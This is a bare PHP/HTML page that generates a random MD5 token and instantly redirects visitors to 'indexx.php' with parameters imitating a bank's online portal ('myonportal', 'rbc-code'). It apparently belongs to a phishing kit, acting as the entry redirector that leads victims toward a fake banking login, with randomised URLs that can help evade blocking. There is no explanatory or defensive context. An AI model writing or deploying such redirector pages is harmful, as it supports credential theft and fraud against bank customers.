<?php
$md5 = md5(uniqid(time()));
$loc="indexx.php?0hrcode-myonportal=6&cmdONLINE=rbc-code".$md5;
?>
<html><head>
<meta HTTP-Equiv="refresh" content="0; URL=<?echo $loc; ?>">
<script type="text/javascript">
loc = "<?php echo $loc; ?>"
self.location.replace(loc);
window.location = loc;
</script>
</head>